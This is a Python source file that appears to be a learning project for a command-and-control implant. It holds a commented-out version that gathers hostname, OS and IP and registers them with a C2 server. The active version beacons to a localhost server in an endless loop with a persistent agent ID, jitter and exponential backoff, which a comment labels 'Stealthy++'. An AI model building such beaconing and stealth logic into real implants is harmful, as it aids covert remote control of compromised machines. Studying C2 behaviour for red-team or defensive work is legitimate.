# import requests
# import platform
# import socket
# import time

# C2_SERVER = "http://127.0.0.1:8000"

# agent_id = None


# # ---------------------------
# # Collect System Information
# # ---------------------------
# def get_system_info():
#     return {
#         "hostname": socket.gethostname(),
#         "username": platform.node(),
#         "os": platform.system() + " " + platform.release(),
#         "ip": socket.gethostbyname(socket.gethostname())
#     }


# # ---------------------------
# # Register Agent
# # ---------------------------
# def register():
#     global agent_id

#     data = get_system_info()

#     try:
#         response = requests.post(f"{C2_SERVER}/register", json=data)

#         if response.status_code == 200:
#             agent_id = response.json()["agent_id"]
#             print(f"[+] Registered with ID: {agent_id}")

#     except Exception as e:
#         print("[-] Registration failed:", e)


# # ---------------------------
# # Beacon Loop
# # ---------------------------
# def beacon():
#     global agent_id

#     while True:
#         try:
#             response = requests.post(f"{C2_SERVER}/beacon/{agent_id}")

#             if response.status_code == 200:
#                 task = response.json()["task"]
#                 print(f"[+] Received Task: {task}")

#         except Exception as e:
#             print("[-] Beacon failed:", e)

#         time.sleep(10)  # Beacon interval


# # ---------------------------
# # Main Execution
# # ---------------------------
# if __name__ == "__main__":
#     register()

#     if agent_id:
#         beacon()


import requests

SERVER_URL = "http://127.0.0.1:8000/beacon"

retry_count = 0

import os
import uuid

AGENT_FILE = "agent_id.txt"


def get_agent_id():
    if os.path.exists(AGENT_FILE):
        with open(AGENT_FILE, "r") as f:
            return f.read().strip()

    agent_id = str(uuid.uuid4())

    with open(AGENT_FILE, "w") as f:
        f.write(agent_id)

    return agent_id


AGENT_ID = get_agent_id()

import random
import time

BASE_INTERVAL = 10
JITTER_PERCENT = 0.3   # 30%


def jitter_sleep():
    jitter = BASE_INTERVAL * JITTER_PERCENT
    sleep_time = random.uniform(
        BASE_INTERVAL - jitter,
        BASE_INTERVAL + jitter
    )

    time.sleep(sleep_time)
    
MAX_RETRIES = 5
INITIAL_BACKOFF = 5


def backoff_sleep(attempt):
    sleep_time = INITIAL_BACKOFF * (2 ** attempt)
    sleep_time += random.uniform(0, 3) # Aditionally added for testing. Adds jitter to retry backoff. Stealthy++
    print(f"[!] Server unreachable. Retrying in {sleep_time}s")
    time.sleep(sleep_time)



while True:
    try:
        response = requests.post(
            SERVER_URL,
            json={"agent_id": AGENT_ID},
            timeout=5
        )

        if response.status_code == 200:
            print("[+] Beacon successful")

            retry_count = 0
            jitter_sleep()

        else:
            raise Exception("Bad response")

    except Exception as e:
        print("[X] Beacon failed:", e)

        if retry_count < MAX_RETRIES:
            backoff_sleep(retry_count)
            retry_count += 1
        else:
            print("[!] Max retries reached. Sleeping long.")
            time.sleep(60)